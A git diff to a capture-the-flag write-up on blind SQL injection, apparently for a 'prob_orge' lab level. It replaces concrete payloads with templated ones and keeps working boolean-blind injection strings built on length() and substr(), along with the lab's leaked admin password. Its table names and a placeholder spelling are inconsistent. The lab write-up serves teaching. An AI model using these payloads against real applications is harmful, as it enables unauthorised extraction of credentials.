@@ -39,12 +39,6 @@ The resultant query becomes:
 
 ```sql
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && length(pw)=1 -- -'
-
-## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && length(pw)=1
-
-## Commented part:
-'
 ```
 
 ![2](https://github.com/Kunull/Write-ups/assets/110326359/54dd9da3-f4bc-425a-99aa-719ad27b3fba)
@@ -56,26 +50,16 @@ That tells us that the length of the `pw` column is more than 1.
 If we keep increasing the length and provide the following URI parameter:
 
 ```
-?pw=' || id='admin' %26%26 length(pw)=8 -- -
+?pw=' || id='admin' %26%26 length(pw)=[length] -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=8 -- -'
-
-## Queried part:
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=8
-
-## Commented part:
-'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=[lenght] -- -'
 ```
 
-![3](https://github.com/Kunull/Write-ups/assets/110326359/4239c4cf-ee50-4569-ba04-c53e6763f684)
-
-Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
-
-That tells us that the length of the `pw` column is 8.
+When the length of `pw` for `id='admin'` is equal to the `[length]` that we provide, the query will result into `True`. This will cause the `Hello admin` message to be printed. We can brute force the length and use the message as an indicator of correct brute force value.
 
 ### Leaking the password
 
@@ -88,76 +72,16 @@ Next, we can leak the password byte by byte using the `substr()` function.
 If we provide the following URI parameter:
 
 ```
-?pw=' || id='admin' %26%26 substr(pw, 1, 1)='0' -- -
+?pw=' || id='admin' %26%26 substr(pw, [index], 1)='[character]' -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0' -- -'
-
-## Queried part:
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0'
-
-## Commented part:
-'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, [index], 1)='[character]' -- -'
 ```
 
-![4](https://github.com/Kunull/Write-ups/assets/110326359/e90ce2aa-7d48-46da-b082-bad77687875b)
-
-Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
-
-That tells us that the first character of the `pw` for `id=admin` is not `0`.
-
-We can try other characters moving up to the following:
-
-```
-?pw=' || id='admin' %26%26 substr(pw, 1, 1)='7' -- -
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7' -- -'
-
-## Queried part:
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7'
-
-## Commented part:
-'
-```
-
-![5](https://github.com/Kunull/Write-ups/assets/110326359/6cb53029-51de-43bd-9456-d62d95321eca)
-
-Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
-
-That tells us that the first character of the `pw` for `id=admin` is `0`.
-
-We can move onto the next characters:
-
-```
-?pw=' || id='admin' %26%26 substr(pw, 2, 1)='0' -- -
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0' -- -'
-
-## Queried part:
-SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0'
-
-## Commented part:
-'
-```
-
-![6](https://github.com/Kunull/Write-ups/assets/110326359/57096134-2e7f-4417-a442-d2cd1c2ad761)
-
-Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
-
-That tells us that the second character of the `pw` for `id=admin` is not `0`.
-
-We can keep repeating this process until we get all the eight characters of the `admin` password:
+If for `id='admin'`, the character of the `pw` at `[index]` is the same as the `[character]` that we provide, the query will result into `True`. This will cause the `Hello admin` message to be printed. We can brute force the password by changing the `[index]` and the `[character]`.
 
 ```
 7b751aec
